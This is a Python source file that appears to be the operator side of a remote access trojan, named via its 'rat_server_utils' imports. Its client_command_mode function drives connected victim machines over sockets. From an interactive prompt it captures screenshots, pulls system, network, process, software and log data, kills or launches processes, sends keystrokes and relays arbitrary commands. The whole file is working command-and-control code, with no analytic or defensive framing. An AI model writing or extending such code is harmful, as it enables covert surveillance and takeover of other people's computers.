import sys
import time
import socket
import colorama # type: ignore
from colorama import Fore, Style # type: ignore
from modules.rat_server_utils import clear_screen, handle_client_disconnect, receive_screenshot, show_client_commands
from modules.server_ui_utils import print_banner
from modules.server_formatings import (
    format_network_info, 
    format_system_info, 
    format_process_list, 
    format_installed_software,
    format_system_logs,
    format_screenshot_notification
)

def client_command_mode(active_client, client_sockets, server_running, print_banner, buffer_size=1024):
    """Enter client command mode for the active client"""
    
    if active_client < 0 or not server_running:
        print(f"{Fore.RED}No client selected or server not running{Style.RESET_ALL}")
        return active_client
    
    # Define a local wrapper for handle_client_disconnect
    def handle_client_disconnect_wrapper_local(client_id):
        """Local wrapper for handle_client_disconnect"""
        from modules.rat_server_utils import handle_client_disconnect
        return handle_client_disconnect(client_id, client_sockets, active_client)
    
    # Define valid commands and their prefixes
    valid_commands = [
        "back", "help", "clear", "kill", "exit", "screenshot", "sysinfo", "netinfo", 
        "list_processes", "search_process", "terminate_process", "send_keys", 
        "system_logs", "installed_software", "launch_app"
    ]
    
    # Function to check if a command is valid
    def is_valid_command(cmd):
        cmd_parts = cmd.lower().split()
        if not cmd_parts:
            return False
        
        base_cmd = cmd_parts[0]
        
        # Check if it's a valid base command
        for valid_cmd in valid_commands:
            if base_cmd == valid_cmd:
                return True
            # Check for commands with parameters (e.g., search_process firefox)
            if valid_cmd.endswith("_process") and base_cmd.endswith("_process"):
                return True
            # Check for system_logs with parameters
            if valid_cmd == "system_logs" and base_cmd == "system_logs":
                return True
        
        return False
    
    # Clear screen and show banner
    clear_screen()
    print_banner()
    print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}\n")
    
    while active_client >= 0 and server_running:
        try:
            # Use gradient colors for the client prompt
            sys.stdout.write(f"\033[1m{Fore.RED}C{Fore.LIGHTRED_EX}l{Fore.WHITE}i{Fore.LIGHTCYAN_EX}e{Fore.LIGHTBLUE_EX}n{Fore.BLUE}t {active_client}> {Style.RESET_ALL}")
            sys.stdout.flush()
            command = input()
            
            # Skip empty commands
            if not command.strip():
                continue
            
            # Handle local commands (not sent to client)
            if command.lower() == "back":
                break
            
            if command.lower() == "help":
                print("")
                show_client_commands()
                print("")
                continue
            
            if command.lower() == "clear":
                clear_screen()
                print_banner()
                print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")
                continue
            
            # Check if client socket is still valid
            if not client_sockets[active_client]:
                print(f"{Fore.RED}Client {active_client} is no longer connected{Style.RESET_ALL}")
                active_client = -1
                input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                break
            
            # Validate command before sending to client
            if not is_valid_command(command):
                print(f"{Fore.RED}Invalid command: {command}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
                continue
            
            # Handle special commands
            if command.lower() == "kill":
                try:
                    client_sockets[active_client].send("kill_client".encode())
                    print(f"{Fore.RED}Kill command sent to client {active_client}{Style.RESET_ALL}")
                    time.sleep(1)  # Wait a moment for the command to be processed
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
                except:
                    print(f"{Fore.RED}Error sending kill command to client {active_client}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "exit":
                try:
                    client_sockets[active_client].send("exit".encode())
                    print(f"{Fore.YELLOW}Exit command sent to client {active_client}{Style.RESET_ALL}")
                    time.sleep(1)  # Wait a moment for the command to be processed
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    print(f"{Fore.YELLOW}Client {active_client} disconnected. Returning to main menu...{Style.RESET_ALL}")
                    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    break
                except:
                    print(f"{Fore.RED}Error sending exit command{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "screenshot":
                try:
                    client_sockets[active_client].send("screenshot".encode())
                    print(f"{Fore.CYAN}Requesting screenshot from client {active_client}...{Style.RESET_ALL}")
                    filename = receive_screenshot(client_sockets[active_client], buffer_size)
                    if filename:
                        # Use the format_screenshot_notification function instead of hardcoded formatting
                        notification = format_screenshot_notification(filename)
                        print(notification)
                    else:
                        print(f"{Fore.RED}╔════════════════════════════════════════════════════╗{Style.RESET_ALL}")
                        print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.WHITE}Failed to receive screenshot{Style.RESET_ALL}{' ' * 19} {Fore.RED}║{Style.RESET_ALL}")
                        print(f"{Fore.RED}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                except:
                    print(f"{Fore.RED}Error sending screenshot command{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "sysinfo":
                try:
                    # Clear any pending data in the socket buffer
                    try:
                        while client_sockets[active_client].recv(1024, socket.MSG_DONTWAIT):
                            pass
                    except:
                        pass  # Socket is empty or would block
                    
                    client_sockets[active_client].send("sysinfo".encode())
                    print(f"{Fore.CYAN}Requesting system information from client {active_client}...{Style.RESET_ALL}")
                    
                    # Receive response in chunks
                    full_response = ""
                    client_sockets[active_client].settimeout(15.0)  # Longer timeout for this operation
                    
                    # Use a more reliable approach to receive all data
                    start_time = time.time()
                    max_time = 15.0  # Maximum time to wait for complete response
                    
                    while (time.time() - start_time) < max_time:
                        try:
                            chunk = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
                            if not chunk:
                                print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                                active_client = handle_client_disconnect_wrapper_local(active_client)
                                break
                            
                            # Check for end marker
                            if "##END_OF_SYSINFO##" in chunk:
                                chunk = chunk.replace("##END_OF_SYSINFO##", "")
                                full_response += chunk
                                break
                            
                            full_response += chunk
                        except socket.timeout:
                            # If we've received some data and then timeout, we might be done
                            if full_response:
                                break
                    
                    # Reset timeout to default
                    client_sockets[active_client].settimeout(None)
                    
                    if full_response:
                        print(f"\n{Fore.GREEN}System Information from client {active_client}:{Style.RESET_ALL}")
                        # Replace the raw print with formatted output
                        formatted_info = format_system_info(full_response)
                        print(formatted_info)
                    else:
                        print(f"{Fore.RED}No response received from client{Style.RESET_ALL}")
                    
                except Exception as e:
                    print(f"{Fore.RED}Error receiving system information: {str(e)}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "installed_software":
                try:
                    client_sockets[active_client].send("installed_software".encode())
                    print(f"{Fore.CYAN}Requesting installed software list from client {active_client}...{Style.RESET_ALL}")
                    
                    # Receive response in chunks
                    full_response = ""
                    client_sockets[active_client].settimeout(20.0)  # Longer timeout for this operation
                    
                    # Keep receiving until we get the end marker
                    while True:
                        chunk = client_sockets[active_client].recv(4096).decode('utf-8', errors='replace')
                        if "##END_OF_SOFTWARE_LIST##" in chunk:
                            # Remove the end marker
                            chunk = chunk.replace("##END_OF_SOFTWARE_LIST##", "")
                            full_response += chunk
                            break
                        full_response += chunk
                    
                    # Reset timeout to default
                    client_sockets[active_client].settimeout(None)
                
                    if full_response:
                        print(f"\n{Fore.CYAN}Installed Software:{Style.RESET_ALL}")
                        # Format the software list with colors and structure
                        formatted_software = format_installed_software(full_response)
                        print(formatted_software)
                    else:
                        print(f"{Fore.RED}No response received from client{Style.RESET_ALL}")
                    
                except Exception as e:
                    print(f"{Fore.RED}Error receiving software list: {str(e)}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "list_processes":
                try:
                    client_sockets[active_client].send("list_processes".encode())
                    print(f"{Fore.CYAN}Requesting process list from client {active_client}...{Style.RESET_ALL}")
                    
                    # Receive response in chunks
                    full_response = ""
                    client_sockets[active_client].settimeout(15.0)  # Longer timeout for this operation
                    
                    while True:
                        try:
                            chunk = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
                            if not chunk:
                                break
                            
                            # Check for end marker
                            if "##END_OF_PROCESS_LIST##" in chunk:
                                chunk = chunk.replace("##END_OF_PROCESS_LIST##", "")
                                full_response += chunk
                                break
                            
                            full_response += chunk
                        except socket.timeout:
                            print(f"{Fore.YELLOW}Timeout while receiving data, showing partial results{Style.RESET_ALL}")
                            break
                    
                    # Format and display the process list
                    formatted_process_list = format_process_list(full_response)
                    print(formatted_process_list)
                    
                    client_sockets[active_client].settimeout(None)  # Reset timeout
                except Exception as e:
                    print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
                    handle_client_disconnect(active_client, client_sockets)
                    active_client = -1
                    return active_client
            
            elif command.lower().startswith("start_process ") or command.lower().startswith("search_process ") or command.lower().startswith("launch_app "):
                try:
                    # Clear any pending data in the socket buffer
                    try:
                        while client_sockets[active_client].recv(1024, socket.MSG_DONTWAIT):
                            pass
                    except:
                        pass  # Socket is empty or would block
                    
                    # Send the command
                    client_sockets[active_client].send(command.encode())
                    print(f"{Fore.CYAN}Sending command to client {active_client}: {command}{Style.RESET_ALL}")
                    
                    # Receive response with timeout
                    client_sockets[active_client].settimeout(10.0)
                    try:
                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
                        if not response:
                            print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                            active_client = handle_client_disconnect_wrapper_local(active_client)
                            input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                            break
                        
                        print(f"{Fore.GREEN}Response from client {active_client}:{Style.RESET_ALL}")
                        print(response)
                    except socket.timeout:
                        print(f"{Fore.RED}Timeout waiting for response from client {active_client}{Style.RESET_ALL}")
                    
                    client_sockets[active_client].settimeout(None)  # Reset timeout
                except Exception as e:
                    print(f"{Fore.RED}Error sending command: {str(e)}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.lower() == "netinfo":
                try:
                    # Clear any pending data in the socket buffer
                    try:
                        while client_sockets[active_client].recv(1024, socket.MSG_DONTWAIT):
                            pass
                    except:
                        pass  # Socket is empty or would block
                    
                    client_sockets[active_client].send("network".encode())
                    print(f"{Fore.CYAN}Requesting network information from client {active_client}...{Style.RESET_ALL}")
                    
                    # Receive response in chunks
                    full_response = ""
                    client_sockets[active_client].settimeout(15.0)  # Longer timeout for this operation
                    
                    # Use a more reliable approach to receive all data
                    start_time = time.time()
                    max_time = 15.0  # Maximum time to wait for complete response
                    
                    while (time.time() - start_time) < max_time:
                        try:
                            chunk = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
                            if not chunk:
                                print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                                active_client = handle_client_disconnect_wrapper_local(active_client)
                                break
                            
                            # Check for end marker
                            if "##END_OF_NETWORK_INFO##" in chunk:
                                chunk = chunk.replace("##END_OF_NETWORK_INFO##", "")
                                full_response += chunk
                                break
                            
                            full_response += chunk
                        except socket.timeout:
                            # If we've received some data and then timeout, we might be done
                            if full_response:
                                break
                    
                    # Reset timeout to default
                    client_sockets[active_client].settimeout(None)
                    
                    if full_response:
                        print(f"\n{Fore.GREEN}Network Information from client {active_client}:{Style.RESET_ALL}")
                        # Format the network information with colors and structure
                        formatted_info = format_network_info(full_response)
                        print(formatted_info)
                    else:
                        print(f"{Fore.RED}No response received from client{Style.RESET_ALL}")
                    
                except Exception as e:
                    print(f"{Fore.RED}Error receiving network information: {str(e)}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            elif command.startswith("system_logs"):
                try:
                    # Send the command to the client
                    client_sockets[active_client].send(command.encode())
                    
                    # Set a timeout for receiving the response
                    client_sockets[active_client].settimeout(30)
                    
                    # Receive the response in chunks until we get the end marker
                    full_response = ""
                    while True:
                        chunk = client_sockets[active_client].recv(buffer_size).decode()
                        if "##END_OF_SYSTEM_LOGS##" in chunk:
                            full_response += chunk.replace("##END_OF_SYSTEM_LOGS##", "")
                            break
                        full_response += chunk
                    
                    # Reset timeout to default
                    client_sockets[active_client].settimeout(None)
                    
                    if full_response:
                        print(f"\n{Fore.GREEN}System Logs from client {active_client}:{Style.RESET_ALL}")
                        # Format and display the logs
                        formatted_logs = format_system_logs(full_response)
                        print(formatted_logs)
                    else:
                        print(f"{Fore.RED}No response received from client{Style.RESET_ALL}")
                    
                except Exception as e:
                    print(f"{Fore.RED}Error receiving system logs: {str(e)}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            else:
                try:
                    client_sockets[active_client].send(command.encode())
                    print(f"{Fore.CYAN}Command sent to client {active_client}: {command}{Style.RESET_ALL}")
                    
                    # Wait for a response with timeout
                    client_sockets[active_client].settimeout(5.0)
                    try:
                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
                        if response:
                            print(f"{Fore.GREEN}Response from client {active_client}:{Style.RESET_ALL}")
                            print(response)
                    except socket.timeout:
                        print(f"{Fore.YELLOW}No response received from client (timeout){Style.RESET_ALL}")
                    
                    client_sockets[active_client].settimeout(None)
                except:
                    print(f"{Fore.RED}Error sending command to client {active_client}{Style.RESET_ALL}")
                    active_client = handle_client_disconnect_wrapper_local(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Returning to main menu...{Style.RESET_ALL}")
            break
    
    return active_client

def handle_client_disconnect_wrapper(client_sockets, client_id, active_client):
    """Wrapper for handle_client_disconnect that updates active_client if needed"""
    handle_client_disconnect(client_id, client_sockets, active_client)
    if client_id == active_client:
        return -1
    return active_client















